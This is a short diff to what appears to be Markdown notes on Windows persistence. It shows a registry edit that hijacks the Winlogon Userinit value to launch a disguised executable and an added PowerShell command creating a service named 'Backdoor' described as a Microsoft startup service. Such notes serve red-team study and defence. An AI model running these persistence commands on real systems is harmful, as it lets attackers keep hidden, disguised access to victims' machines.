@@ -37,5 +37,9 @@ reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Users\KarMarKhaing\Vmware_Host.exe","C:\Windows\system32\userinit.exe"
 
 ```
+### Services
+```
+New-Service -Name "Backdoor" -BinaryPathName " C:\Users\KarMarKhaing\MS_Startup.exe" -Description "Microsoft Service for Startups"
 
+```
 
